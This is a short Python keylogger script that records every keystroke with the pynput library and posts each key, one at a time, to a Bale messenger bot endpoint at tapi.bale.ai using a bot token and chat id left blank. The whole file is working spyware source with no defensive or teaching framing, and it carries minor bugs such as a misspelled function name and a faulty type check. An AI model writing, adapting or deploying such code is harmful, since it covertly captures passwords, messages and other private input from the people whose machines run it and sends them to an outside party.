from pynput import keyboard 
import requests

token = ""
chat_id = ""

mylist = []

def keyboadr_start():
    with keyboard.Listener(on_press=keyboard_log) as lstn:
        lstn.join()

    
def keyboard_log(key):
    if type(key) == keyboard:
        key = key.char

    else:
        key = str(key)

    mylist.append(key)
    if len(mylist) == 1:
        requests.post(f'https://tapi.bale.ai/bot{token}/sendMessage?chat_id={chat_id}&text={mylist}')
        mylist.remove(key)
        
        
keyboadr_start()
